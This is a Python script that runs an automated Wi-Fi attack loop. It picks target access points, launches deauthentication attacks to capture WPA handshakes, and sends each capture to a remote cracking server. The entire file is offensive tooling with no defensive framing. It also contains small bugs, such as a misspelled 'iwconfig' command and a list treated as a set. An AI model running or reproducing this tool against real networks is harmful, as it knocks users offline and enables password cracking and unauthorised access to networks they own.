#!/usr/bin/env python
import sys
import argparse
import intel_collector
import stripload
import attacker
import exceptions
import time
import subprocess
import logging


ATTACK_TIMEOUT = 3 * 60
# INTEL_TIME = 1 * 60
INTEL_TIME = 5


def set_channel(iface, channel):
    subprocess.check_call(["iwconfing", iface, "channel", str(channel)])


def str2addr(s):
    ip, port = s.split(":")
    return (ip, int(port))


def filter_failed(failed):
    current = time.time()
    return {target: time for target, time in failed.iteritems()
            if current - time < ATTACK_TIMEOUT / 2}


def main(args):
    logging.basicConfig(level=logging.DEBUG)
    logging.info("starting")
    parser = argparse.ArgumentParser()
    parser.add_argument("iface", help="interface in monitor mode")
    parser.add_argument("server", help="ip:port of cracking server")
    parsed = parser.parse_args(args[1:])

    intel = intel_collector.IntelCollector(parsed.iface)

    stripper = stripload.StripLoad(parsed.iface, str2addr(parsed.server))
    stripper.start()

    failed = {}
    uploaded = []
    intel_timeout = INTEL_TIME

    while True:
        failed = filter_failed(failed)

        logging.info("looking for targets... %d seconds" % intel_timeout)
        if failed or uploaded:
            logging.debug("ignoring: %s" % ", ".join(failed.keys() + uploaded))

        target, clients = intel.choose_target(intel_timeout,
                                              ignore=failed.keys() + uploaded)
        if not target:
            intel_timeout *= 2
            logging.info("no target found, trying again...")
            continue

        intel_timeout = INTEL_TIME
        logging.info("attacking target %s" % str(target.bssid))
        attack = attacker.DeauthAttacker(parsed.iface, target,
                                         client=clients[0] if clients else None)
        attack.start()
        try:
            logging.info("waiting for handshake, %d seconds" % ATTACK_TIMEOUT)
            stripper.wait_load(target, ATTACK_TIMEOUT)
            uploaded.add(target.bssid)
        except exceptions.Exception as e:
            logging.info(
                "failed (%s) attacking %s, will not attack it for %d seconds" %
                (str(e), target, ATTACK_TIMEOUT/2))
            failed[target.bssid] = time.time()

        attack.terminate()

if __name__ == "__main__":
    sys.exit(main(sys.argv))
